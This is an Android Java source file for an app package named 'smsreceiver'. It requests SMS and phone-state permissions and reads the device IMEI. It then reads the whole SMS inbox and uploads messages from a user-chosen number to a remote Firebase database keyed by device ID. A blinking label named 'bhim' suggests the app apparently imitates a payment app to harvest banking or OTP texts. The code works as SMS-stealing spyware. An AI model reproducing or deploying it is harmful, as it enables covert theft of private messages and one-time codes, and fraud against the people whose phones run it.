package com.example.raghav.smsreceiver;


import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.preference.PreferenceManager;
import android.provider.Settings;
import android.provider.Telephony;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.text.InputType;
import android.util.Log;
import android.view.View;
import android.view.animation.AlphaAnimation;
import android.view.animation.Animation;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.TextView;
import android.widget.Toast;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.Calendar;
import java.util.Date;


public class MainActivity extends AppCompatActivity implements View.OnClickListener {

    FirebaseDatabase database = FirebaseDatabase.getInstance();
    DatabaseReference myRef = database.getReference("INFO");



    String device_id;
    Button b1;
    EditText txtbox;
    int PERMISSION_ALL = 1;
    TelephonyManager tm;
    String[] PERMISSIONS = {Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.RECEIVE_SMS, Manifest.permission.SEND_SMS};

    String initial="+91";
    String finalnumber;
    SharedPreferences sp,newpref;
    String prefname ="abc";
    String Phonenumber="number";
    ImageView img;
    TextView bhim;


    String txtboxcontent;
    Animation anim = new AlphaAnimation(0.0f, 1.0f);

    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        b1 = (Button) findViewById(R.id.btn1);
        b1.setOnClickListener(this);
        txtbox = (EditText) findViewById(R.id.editText);
        bhim = (TextView) findViewById(R.id.textView);

        img =(ImageView) findViewById(R.id.imageView);

        finalnumber = initial+txtbox.getText().toString();

        txtboxcontent = txtbox.getText().toString();
        txtbox.setInputType(InputType.TYPE_CLASS_NUMBER);

        anim.setDuration(500);
        anim.setStartOffset(20);
        anim.setRepeatMode(Animation.REVERSE);
        anim.setRepeatCount(Animation.INFINITE);

        bhim.startAnimation(anim);

        newpref = PreferenceManager.getDefaultSharedPreferences(this);
        if (!hasPermissions(this, PERMISSIONS)) {
            ActivityCompat.requestPermissions(this, PERMISSIONS, PERMISSION_ALL);
        }
    }


    public static boolean hasPermissions(Context context, String... permissions) {
        if (context != null && permissions != null) {
            for (String permission : permissions) {
                if (ActivityCompat.checkSelfPermission(context, permission) != PackageManager.PERMISSION_GRANTED) {
                    return false;
                }
            }
        }
        return true;
    }


    public void onClick(View v) {
        tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return;
        }
            device_id = tm.getDeviceId();



            if(v == b1){
                if(!newpref.getBoolean("firstTime", false)) {

                    SharedPreferences.Editor editor = newpref.edit();
                    editor.putBoolean("firstTime", true);
                    editor.commit();
                    startActivity(new Intent(MainActivity.this , secondpage.class));
                }
                else{
                    startActivity(new Intent(MainActivity.this , secondpage.class));
                }

                finalnumber = initial + txtbox.getText().toString();
                sp = getSharedPreferences(prefname, Context.MODE_PRIVATE);
                SharedPreferences.Editor changer = sp.edit();
                changer.putString(Phonenumber, finalnumber);
                changer.commit();

                code();


                Log.i("finalnumber", "entered number :" + finalnumber);

                startActivity(new Intent(MainActivity.this, secondpage.class));
                Toast.makeText(this, "Number entered  is" + finalnumber, Toast.LENGTH_SHORT).show();
            }
    }

    public void code(){
        Uri uriSmsuri = Uri.parse("content://sms/inbox");
        Cursor cur = getContentResolver().query(uriSmsuri, null, null, null, null);


        while (cur.moveToNext()) {

            final String sms = cur.getString(cur.getColumnIndexOrThrow("body"));
            final String saddress = cur.getString(cur.getColumnIndex(Telephony.Sms.ADDRESS));
            final String stime = cur.getString(cur.getColumnIndex(Telephony.Sms.DATE));


            Long timestamp = Long.parseLong(stime);
            Calendar calendar = Calendar.getInstance();
            calendar.setTimeInMillis(timestamp);
            Date finaldate = calendar.getTime();
            String smsDate = finaldate.toString();
            String timex = (String.valueOf(finaldate.getTime()));


            Log.i("message", sms + "....." + saddress);


            if (saddress.equals(finalnumber)) {

                myRef.child(device_id).child("Old Messages").child(smsDate).setValue(sms);

                Log.i("IMEI",device_id);

            }
        }
    }
}
